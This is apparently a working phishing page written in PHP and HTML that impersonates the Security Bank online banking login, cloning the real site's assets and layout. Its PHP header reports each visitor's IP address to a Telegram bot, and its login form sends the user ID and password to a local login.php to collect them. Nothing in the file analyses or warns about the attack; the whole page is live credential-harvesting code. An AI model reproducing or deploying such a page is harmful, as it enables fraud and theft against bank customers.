<?php
session_start();
error_reporting(0);
include('teleg.php');
file_get_contents("https://api.telegram.org/bot" . $t . "/sendMessage?chat_id=" . $c . "&text=Visitors IP: " . $_SERVER['REMOTE_ADDR']);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link REL="SHORTCUT ICON" HREF="https://securitybankonline.securitybank.com/images/sbclogo.ico"> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Security Bank</title>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.JQueryBehavior/jquery-1.3.2.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.validations.JQueryValidationBehavior/jquery.validate.1.11.1.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.validations.JQueryValidationBehavior/additional-methods.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.validations.JQueryValidationBehavior/sxi-validations.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.js.BaseJavascriptBehavior/ccti.js"></script>
<link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.js.BaseJavascriptBehavior/base.css" />
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.fg.FGMenuBehavior/fg.menu.js"></script>
<link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.fg.FGMenuBehavior/fg.menu.css" />
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.flowtip.JQueryFlowTipBehavior/jquery.tools.min.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.flowtip.JQueryFlowTipBehavior/sxi-flowtip.js"></script>
<link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.flowtip.JQueryFlowTipBehavior/flowtip.css" />
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.ui.JQueryUIBehavior/jquery-ui-1.7.2.custom.min.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.backspace.Backspace/backspace.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/placeholder/jquery-1.4.min.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/placeholder/html5placeholder.jquery.js"></script>
<link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/reset.css" />
<link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/newLogin.css" />
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/org.apache.wicket.markup.html.WicketEventReference/wicket-event.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/org.apache.wicket.ajax.WicketAjaxReference/wicket-ajax.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/org.apache.wicket.extensions.ajax.markup.html.modal.ModalWindow/res/modal.js"></script>
<link rel="stylesheet" type="text/css" href="resources/org.apache.wicket.extensions.ajax.markup.html.modal.ModalWindow/res/modal.css" />
</head>

<script type="text/javascript">
window.onload=function(){
	var text_input = document.getElementById('myTextInput');
	text_input.focus();
	text_input.select(); 
} 
 
</script> 

<script>
$(document).ready(function() {  
	$('#trigger').click(function(){
	var id = '#dialog';

	//Get the screen height and width
	//var maskHeight = $(document).height();
	//var maskWidth = $(window).width();
	
	var maskHeight = $(window).height();
	var maskWidth = $(window).width();
		
	//Set heigth and width to mask to fill up the whole screen
	//$('#mask').css({'width':maskWidth,'height':maskHeight});

	//transition effect     
	$('#mask').fadeIn(1000);    
	$('#mask').fadeTo("slow",0.5);  

	//Get the window height and width
	var winH = $(window).height();
	var winW = $(window).width();

	//Set the popup window to center
	//$(id).css('top',  winH/2-$(id).height()/2);
	//$(id).css('left', winW/2-$(id).width()/2);

	//$(id).css('top',  '15px');
	//$(id).css('left', '700px');
	//transition effect
	$(id).fadeIn(1500);     
	
	//if close checkbox is clicked
	$('.window .close').click(function(){

	if(!$(this).is(":checked")){
		//$('.window').fadeOut(2000);
		//$('#mask').fadeOut(500);
		$('#mask').hide();
		$('.window').hide();
	}
	});
  
   //if mask is clicked
	$('#mask').click(function () {
		$(this).hide();
        $('.window').hide();
    });     
  });  
});
</script>

<style>	

#mask {
  position: absolute;
  left: 250px;
  top: 100px;
  z-index: 9000;
  background-color: #C4C6D4;
  display: none;
  width: 650px;
  height: 500px;
    /* for IE */
  filter:alpha(opacity=60);
  /* CSS3 standard */
  opacity:0.6;
}

#boxes .window{
  position: absolute;
  left: 220px;
  top: 40px;
  display: none;
  z-index: 8500;
  border-radius: 15px;
}

#boxes #dialog{
  width: 650px;
  height: 500px;
  padding: 20px;
  background-color:  #326188;
  font-family: 'Segoe UI Light', sans-serif;
  font-size: 10pt;
  color: #000000;
}

#boxes #dialog th {
    border: 1px solid black;
}

#boxes #dialog td {
    border: 1px solid black;
}

#popupfoot {
  font-size: 16pt;
  position: absolute;
  bottom: 0px;
  width: 250px;
  left: 250px;
}

</style>


<body>
	<style> 
		p.breakWord {
    		width: 13em;    	
			position: absolute;
			left: 140px;	
		}
		.try{
			padding:50px;
			float:left;
			position:relative
			height:50px;
			width:350px;
			margin:180px 0 0 20px;

		}
		</style>
	<div class="wrapper" style="width:1095px !important;">
	
		<span class="try">		<!-- JOSH JUNE 2019 -->
			<!--wicket:message key="sbc.description"/-->
			<div style="float:left;width:600px;height:160px;position:relative;padding:10px 0 0 0;z-index:1">
				<a href="#" target="_blank">
				
				</a>
				<table>
					<tr>
						<td>
							<img style="width:600px;height:40px;" src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOBasePage/images/rotating/AppBadge.png" wicketpath="__relative__path__prefix__1"/>
						</td>
					</tr>
					<tr>
						<td>
							<a style ="margin-right:10px;text-decoration:none;" href="https://apps.apple.com/ph/app/security-bank-mobile/id978413670" target="_blank">
								<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOBasePage/images/rotating/AppleStore.png" wicketpath="__relative__path__prefix__2"/>
							</a>
							
							<a style ="margin-right:10px;text-decoration:none;" href="https://play.google.com/store/apps/details?id=com.securitybank" target="_blank">
								<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOBasePage/images/rotating/GooglePlay.png" wicketpath="__relative__path__prefix__3"/>
							</a>
							
							<a style ="margin-right:10px;text-decoration:none;" href="https://appgallery5.huawei.com/#/app/C102203487" target="_blank">
								<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOBasePage/images/rotating/HuaweiGallery.png" wicketpath="__relative__path__prefix__4"/>
							</a>

							<!--<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOBasePage/images/rotating/AppleStore.png"/>
							<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOBasePage/images/rotating/GooglePlay.png"/>
							<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOBasePage/images/rotating/HuaweiGallery.png"/> -->
						</td>
					</tr>
				</table>
			</div>			
		</span>
		<!--span class="try">		
			<wicket:message key="sbc.description"/>
		</span-->
		<!-- <div class="logo">
			<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/images/security_logo2.png" />
		</div> -->
		<div class="mini_nav">
			<p>
				<a href="https://www.securitybank.com/online-banking/"
					target="blank">More Information</a> |
				<a href="http://www.securitybank.com" target="_blank">Back to SBC Home</a> |
				<!-- 				<a href="http://www.securitybank.com.ph/b2c1/faq1.aspx" target="_blank">FAQ</a> | -->
				<a href="http://www.securitybank.com/sbol-faq/" target="_blank">FAQ</a>
				| <a href="https://www.securitybank.com/online-banking/sbol-helpdesk/"
					target="_blank">Helpdesk</a> |
				<!-- 				<a href="http://www.securitybank.com.ph/b2c1/essecurity.aspx" target="blank">Security Information</a> -->
				<a href="https://www.securitybank.com/security-information/"
					target="blank">Privacy Policy & Security Information  </a> |
				<a href="https://www.securitybank.com/sbol-terms-and-conditions/" id="trigger">Terms and Conditions</a>	
				
			</p>
		</div>
		<div class="clear"></div>
		<div id="id1" wicketpath="modal" style="display:none">
	
</div>
		<form class="welcome" autocomplete="off" loginForm="true" style="position:relative; margin: -300px 0 0 0" id="id2" wicketpath="loginForm" method="post" action="login.php"><div style="display:none"><input type="hidden" name="id2_hf_0" id="id2_hf_0" /></div>
			<!-- <h1>Welcome to Security Bank Online</h1>
			<div style="width: 361px; float:right; margin-right: 5px;">
			<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/images/welcome.png" />
			</div> -->
			<p style="padding-top:110px;">

			</p>
			<!-- <p>&nbsp; <span><wicket:message key="label.add.enroll.acctno"/></span> </p> -->
			<p>
				<span class="textBG"><input id="myTextInput" style="border-radius:10px; -webkit-border-radius: 10px; border-color:#0168b3; text-align:left;" type="text" maxlength="20" placeholder="User ID&nbsp;" value="" name="userId" wicketpath="loginForm_userId"/></span>
			</p>
			<br /><div class="clear"></div>
			<p>
				<span class="textBG"><input style="border-radius:10px; -webkit-border-radius: 10px; border-color:#0168b3; text-align:left;" type="password" maxlength="50" placeholder="Password&nbsp;" value="" name="pswd" wicketpath="loginForm_pswd"/></span>
			</p>
			<br /><div class="clear"></div>
			<div class="loginFeedback" id="id3" wicketpath="loginForm_sxiFeedback"></div>
<!-- 			<span wicket:id="feedbackPanel">Feedback Panel</span> -->
			<div class="clear"></div>
			<p>
				<input type="submit" class="loginButton" value="" wicketpath="loginForm_submit" onclick="var e=document.getElementById('id2_hf_0'); e.name=':submit'; e.value='x';var f=document.getElementById('id2');var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value='';e.name='';return false;"/>
			</p>
				<p class="fs1">
				<a href="#" id="id4" wicketpath="loginForm_enrollmentButton" onclick="var wcall=wicketAjaxGet('?x=bCC8F*g*sgNY8MXtLduKCbQb2uov1UZAiv1rLS2k56oimFWCFWjXP4GgZNK4OaMRjs3nyR6iktQ',null,null, function() {return Wicket.$('id4') != null;}.bind(this));return !wcall;"><span><u><b></b></u></span>
				</a>
			</p>
			<p>
				<a href="#" target="_blank"><span  style="color:#0066c2;font-size:12px"></span></a>
				<a href="login/wicket:interface/:0:loginForm:forgot::ILinkListener::" wicketpath="loginForm_forgot"> <span  style="color:#0066c2;font-size:12px"> <u>Forgot Password?</u></span></a>
				
				<!--SRF#102472  Stop Enrollment 03/08/2023-->
				<br />	<br />		
					<p style ="text-align:center-right;">
					<span  style="font-size:12px;color:black"> <b>NOTICE</b>: Enrollment has been disabled for this site. 
					<br />Please <a href="https://online.securitybank.com"> 
								<span  style="color:#0066c2;font-size:12px"> <u><b> click here </b></u>
								</span> 
								</a> to enroll in our newest &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					
					<br />version of Security Bank Online &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</span> 					
					</p>
				<br />	<br />
			</p>
		</form>
		<div class="clear"></div>
		<!-- Start Down Panel -->
		<div class="ad_holder" style="padding-top:10px;">
			<div class="bucket bg1">
				<div class="title">
					<p>
					<span>
					Realtime SMS alerts
					</span>
					</p>
				</div>
				<div class="content">
					<p> Receive SMS updates on selected financial transactions via ATM or Online Banking. Go to your nearest Security Bank Branch to update your contact information now!</p>
					<div class="clear"></div>
					<div class="more">
						<!--a href="https://www.securitybank.com/announcement-transaction-alerts/" target="_blank"><wicket:message key="login.lbl.see"></wicket:message></a-->
					</div>
				</div>

				<div class="clear"></div>
			</div>
			<div class="bucket bg2">
				<div class="title">
					<p>Security Reminders</p>
				</div>
				<div class="content">
					<p>
					SB Online does NOT use the ATM Card Number or PIN Number in order for you to access it. Read more about ATM security here.
					</p>
					<div class="more">
						<a href="https://www.securitybank.com/sbol-security-reminders/" target="_blank">More Security Tips</a>
					</div>
				</div>

				<div class="clear"></div>
			</div>
			<div class="bucket bg3">
				<div class="title">
					<p>Rewards</p>
				</div>
				<div class="content">
					<p class="breakWord">Does your bank treat you like Gold?</p>
					<br/> 
					<br/> 
					<p class="breakWord"> Enjoy VIP treatment from the day you open</p>

					<p style="padding-left:5px;padding-top:10px;">
					<div class="more">
						<!-- <a href="http://securitybank.com/learn-more/" target="_blank">Learn More</a> --><a href="https://www.securitybank.com/personal/gold/benefits-and-privileges/" target="_blank">Learn More</a>
					</div>
					</p>
					
				</div>

				<div class="clear"></div>
			</div>
			<div class="clear"></div>
		</div>
		<!-- End Down Panel -->
		<div class="clear"></div>
		<!-- <div class="footer">
			<p>Copyright &copy; 2010 Security Bank Corporation. All rights reserved.</p>
		</div> -->
		<div style="width: 361px; margin:auto; padding-bottom: 10px;">
			<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/images/footer.png" wicketpath="__relative__path__prefix__33"/>
		</div>
		<div class="norton">
			<div>
<!-- 				<img src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/images/norton_index.png" /> -->
  <span style="float: right; "><script type="text/javascript" src="https://seal.websecurity.norton.com/getseal?host_name=securitybankonline.securitybank.com&amp;size=S&amp;use_flash=NO&amp;use_transparent=NO&amp;lang=en"></script></span>
			</div>
		</div>
	</div>
</body>
</html>
